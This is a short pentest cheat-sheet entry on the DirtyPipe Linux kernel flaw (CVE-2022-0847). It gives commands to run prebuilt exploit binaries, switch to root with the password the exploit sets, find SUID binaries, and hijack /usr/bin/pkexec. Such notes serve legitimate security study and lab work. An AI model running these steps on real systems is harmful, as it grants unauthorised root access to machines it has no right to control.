
##  DirtyPipe - CVE-2022-0847

`https://docs.h4rithd.com/linux/privilageesc-linux#id-06.9-dirtypipe-cve-2022-0847`
https://docs.h4rithd.com/linux/privilageesc-linux#id-06.9-dirtypipe-cve-2022-0847

```bash
./dpipe-root
su root ## Password is h4rithd

## find SUID Binary
find / -perm -4000 -ls 2>/dev/null
## Execute it as /usr/bin/pkexec
./dpipe-suid  /usr/bin/pkexec
```
